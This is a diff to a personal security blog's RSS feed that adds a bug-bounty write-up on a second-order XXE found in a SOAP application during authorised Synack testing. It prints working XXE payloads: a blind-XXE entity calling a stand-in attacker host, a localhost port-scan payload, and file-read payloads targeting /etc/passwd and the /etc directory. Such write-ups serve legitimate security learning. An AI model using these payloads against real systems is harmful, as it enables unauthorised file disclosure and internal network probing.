@@ -6,7 +6,67 @@
     <description>Recent content on kuldeepdotexe&#39;s blog</description>
     <generator>Hugo -- gohugo.io</generator>
     <language>en-us</language>
-    <lastBuildDate>Mon, 04 Apr 2022 22:14:09 +0530</lastBuildDate><atom:link href="https://kuldeep.io/index.xml" rel="self" type="application/rss+xml" />
+    <lastBuildDate>Wed, 19 Oct 2022 17:59:25 +0530</lastBuildDate><atom:link href="https://kuldeep.io/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>Second Order XXE Exploitation</title>
+      <link>https://kuldeep.io/posts/second-order-xxe-exploitation/</link>
+      <pubDate>Wed, 19 Oct 2022 17:59:25 +0530</pubDate>
+      
+      <guid>https://kuldeep.io/posts/second-order-xxe-exploitation/</guid>
+      <description>Hello, guys!
+This writeup is about my recent discovery on Synack Red Team which was a Second Order XXE that allowed me to read files stored on the web server.
+Please note that this article is not about how/why/when of the XXE attacks. This is just a single case of XXE that I found and I wish to elaborate. If you want to learn more about XXEs, you may refer to the following links:</description>
+      <content>&lt;p&gt;Hello, guys!&lt;/p&gt;
+&lt;p&gt;This writeup is about my recent discovery on Synack Red Team which was a Second Order XXE that allowed me to read files stored on the web server.&lt;/p&gt;
+&lt;p&gt;Please note that this article is not about how/why/when of the XXE attacks. This is just a single case of XXE that I found and I wish to elaborate. If you want to learn more about XXEs, you may refer to the following links:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a href=&#34;https://book.hacktricks.xyz/pentesting-web/xxe-xee-xml-external-entity&#34;&gt;HackTricks XXE&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;https://portswigger.net/web-security/xxe&#34;&gt;Portswigger XXE&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Now to the blog.&lt;/p&gt;
+&lt;p&gt;A fresh target was onboarded in the morning and I hopped onto it as soon as I received the email. In the scope, there were two web applications listed along with two postman collections. I prefer postman collections over web apps so I loaded the collections with their environments into my postman.&lt;/p&gt;
+&lt;p&gt;After sending the very first request, I noticed that the application was using SOAP API to transfer the data. I tried to perform XXE in the SOAP body itself but the application threw an error saying &amp;ldquo;&lt;strong&gt;DOCTYPE is not allowed&lt;/strong&gt;&amp;rdquo;.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://kuldeep.io/DOCTYPENotAllowed.png&#34; alt=&#34;DOCTYPENotAllowed&#34;&gt;&lt;/p&gt;
+&lt;p&gt;Here, we cannot perform XXE as &lt;code&gt;DOCTYPE&lt;/code&gt; is explicitly blocked.&lt;/p&gt;
+&lt;p&gt;Upon checking all the modules one by one, I came across a module named &lt;code&gt;NormalTextRepository&lt;/code&gt; which had the following two requests:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;saveNormalText&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;GetNamedNormalText&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;img src=&#34;https://kuldeep.io/NormalTextRepository.png&#34; alt=&#34;NormalTextRepository&#34;&gt;&lt;/p&gt;
+&lt;p&gt;After sending the first &lt;code&gt;saveNormalText&lt;/code&gt; request and intercepting it in Burp Suite, I found out that it contained some HTML-encoded data that looked like this:&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://kuldeep.io/HTMLEncodedData.png&#34; alt=&#34;HTMLEncodedData&#34;&gt;&lt;/p&gt;
+&lt;p&gt;Upon decoding, the data looked like this:&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;&amp;lt;?xml version=&amp;#34;1.0&amp;#34;?&amp;gt;
+&amp;lt;normal xmlns=&amp;#34;urn:hl7-org:v3&amp;#34; xmlns:XX=&amp;#34;http://REDACTED.com/REDACTED&amp;#34;&amp;gt;&amp;lt;content XX:status=&amp;#34;normal&amp;#34; XX:state=&amp;#34;normal&amp;#34;&amp;gt;Synacktest&amp;lt;/content&amp;gt;&amp;lt;/normal&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;This quickly brought my attention. This was XML data being passed inside the XML body in a SOAP request (Inception vibes).&lt;/p&gt;
+&lt;p&gt;I went on to try XXE here as well. For this, I copy pasted a simple Blind XXE payload from &lt;a href=&#34;https://portswigger.net/web-security/xxe/blind&#34;&gt;PortSwigger&lt;/a&gt;:&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;&amp;lt;!DOCTYPE foo [ &amp;lt;!ENTITY % xxe SYSTEM &amp;#34;http://f2g9j7hhkax.web-attacker.com/XXETEST&amp;#34;&amp;gt; %xxe; ]&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;I used Synack&amp;rsquo;s provided web server to test for this. Upon checking its logs, I found out that there indeed was a hit for the &lt;code&gt;/XXETEST&lt;/code&gt; endpoint.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://kuldeep.io/TUPoCHit.png&#34; alt=&#34;TUPoCHit&#34;&gt;&lt;/p&gt;
+&lt;p&gt;This still was a blind XXE and I had to turn it into a full XXE in order to receive a full payout. I tried different file read payloads from &lt;a href=&#34;https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection&#34;&gt;PayloadsAllTheThings&lt;/a&gt; and &lt;a href=&#34;https://book.hacktricks.xyz/pentesting-web/xxe-xee-xml-external-entity&#34;&gt;HackTricks&lt;/a&gt; but they did not seem to work in my case.&lt;/p&gt;
+&lt;p&gt;In my case, the XXE was not reflected anywhere in the response. This is why it was comparatively difficult to exploit.&lt;/p&gt;
+&lt;p&gt;After poking for a while, I gave up with the idea of full XXE and went ahead to check if port scan was possible or not as we were able to send HTTP requests.&lt;/p&gt;
+&lt;p&gt;I sent the request to Burp Suite&amp;rsquo;s intruder and fuzzed for the ports from 1 to 1000. The payload for that looked like the following:&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;&amp;lt;!DOCTYPE foo [ &amp;lt;!ENTITY % xxe SYSTEM &amp;#34;http://127.0.0.1:§1§/XXETEST&amp;#34;&amp;gt; %xxe; ]&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;However, the result of the intruder was just not making any sense to me. All the ports that I fuzzed were throwing random time delays.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://kuldeep.io/IntruderPortScan.png&#34; alt=&#34;IntruderPortScan&#34;&gt;&lt;/p&gt;
+&lt;p&gt;Again, lost all hope and was about to give up on this XXE once again. Then a thought struck my head. &amp;ldquo;If this data is being saved in the application, there should be some way to retrieve it also&amp;rdquo;. I checked the other &lt;code&gt;GetNamedNormalText&lt;/code&gt; request in this module and immediately felt stupid. This request retrieved the data that we saved from the first &lt;code&gt;saveNormalText&lt;/code&gt; request.&lt;/p&gt;
+&lt;p&gt;I used the following XXE file read payload and saved the data:&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;&amp;lt;?xml version=&amp;#34;1.0&amp;#34; encoding=&amp;#34;UTF-8&amp;#34;?&amp;gt;&amp;lt;!DOCTYPE foo [&amp;lt;!ENTITY example SYSTEM &amp;#34;/etc/passwd&amp;#34;&amp;gt; ]&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Then sent the second &lt;code&gt;GetNamedNormalText&lt;/code&gt; request to retrieve the saved data. And in the response, I could see the contents of the &lt;code&gt;/etc/passwd&lt;/code&gt; file!&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://kuldeep.io/EtcPasswd.png&#34; alt=&#34;/etc/passwd&#34;&gt;&lt;/p&gt;
+&lt;p&gt;This was enough for a proof of concept. However, looking at the &lt;strong&gt;JSESSIONCOOKIE&lt;/strong&gt;, I could tell that the application was built using Java. And, in Java applications, if you just provide a directory instead of a file, it will list down the contents of that directory and return it.&lt;/p&gt;
+&lt;p&gt;For this purpose, I just removed the &lt;code&gt;/passwd&lt;/code&gt; portion from the above file read payload. The updated payload looked like this:&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;&amp;lt;?xml version=&amp;#34;1.0&amp;#34; encoding=&amp;#34;UTF-8&amp;#34;?&amp;gt;&amp;lt;!DOCTYPE foo [&amp;lt;!ENTITY example SYSTEM &amp;#34;/etc&amp;#34;&amp;gt; ]&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Upon saving the above payload and retrieving it using the second request, we could see the directory listing of the &lt;code&gt;/etc&lt;/code&gt; directory!&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://kuldeep.io/EtcDirectoryList.png&#34; alt=&#34;/etc Directory Listing&#34;&gt;&lt;/p&gt;
+&lt;p&gt;Sent it to Synack and they happily triaged it within approximately 2 hours.&lt;/p&gt;
+&lt;p&gt;Thank you for reading. :)&lt;/p&gt;
+&lt;p&gt;You can reach out to me at &lt;a href=&#34;https://twitter.com/kuldeepdotexe&#34;&gt;@kuldeepdotexe&lt;/a&gt;.&lt;/p&gt;
+</content>
+    </item>
+    
     <item>
       <title>NoSQL Injection in Plain Sight</title>
       <link>https://kuldeep.io/posts/nosql-injection-in-plain-sight/</link>
